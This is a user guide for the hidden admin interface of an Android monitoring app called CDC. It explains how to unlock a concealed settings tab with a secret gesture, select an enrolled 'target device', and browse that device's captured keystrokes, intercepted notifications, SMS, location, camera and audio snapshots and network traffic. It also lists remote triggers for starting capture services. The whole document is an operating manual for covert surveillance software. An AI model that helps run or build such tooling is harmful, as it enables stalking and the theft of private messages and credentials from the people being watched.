# Admin Viewer Guide

The Admin Viewer is a "hidden" management interface built directly into the CDC application. It allows an operator to select any enrolled device and browse its captured data in real-time.

## 🔓 How to Access

The Settings tab (Admin Viewer) is hidden by default to prevent unauthorized access.

1.  Open the CDC app.
2.  Navigate to the **Home** fragment.
3.  **The Gesture**: Long-press the "Home" icon in the bottom navigation bar **3 times** within a 20-second window.
4.  The "Settings" icon will appear in the navigation bar.

---

## 📱 Device Selection

Before viewing data, you must select a target device:

1.  Click the **Settings** tab.
2.  Use the **User Dropdown** at the top to see all devices currently synced to the Firebase project.
3.  Selecting a user will display their basic device metadata (Brand, Android Version, ID).

---

## 🔍 Data Viewers

Once a device is selected, you can access several specialized viewers:

### ⌨️ Keystrokes Feed
*   **Path**: `KeyStrokesFragment`
*   **Features**: View all captured text grouped by application. Use the package filter to see typing from specific apps like WhatsApp or Messages.

### 🔔 Notifications Feed
*   **Path**: `AccessibilityNotificationFragment`
*   **Features**: Displays intercepted notifications, including the title, content, and hidden metadata (extras).

### 📊 App Usage Reports
*   **Path**: `SystemAppUsageStatisticsFragment`
*   **Features**: Displays total time spent and session counts for apps on a per-day basis.
*   **Action**: You may need to trigger a "Report Generation" from the Click Actions panel first.

### 📍 Location & Media
*   **Features**: Real-time location tracking on maps, and viewing captured camera/audio snapshots (synced from Storage).

### 🌐 VPN & Traffic
*   **Path**: `AdminVpnFragment`
*   **Features**: View real-time network metadata captured by the VPN service and manage the list of blocked applications.

---

## 🕹️ Remote Control (Click Actions)

The **Click Actions** panel is the remote control center for the target device. Every change made here is synced via Firebase and executed by the target device within seconds.

| Action Category | Key Triggers |
| :--- | :--- |
| **Capture** | `CAPTURE_KEY_STROKES`, `START_SCREENSHOT_SERVICE`, `CAPTURE_ALL_SMS` |
| **System** | `REQUEST_ALL_PERMISSION`, `PREVENT_BATTERY_OPTIMIZATIONS`, `RESET_EVERYTHING` |
| **Services** | `START_SENSOR_SERVICE`, `MONITOR_CALL_STATE`, `GET_APP_USAGE_STATISTICS_REPORT` |

---
[Return to README](../README.md)
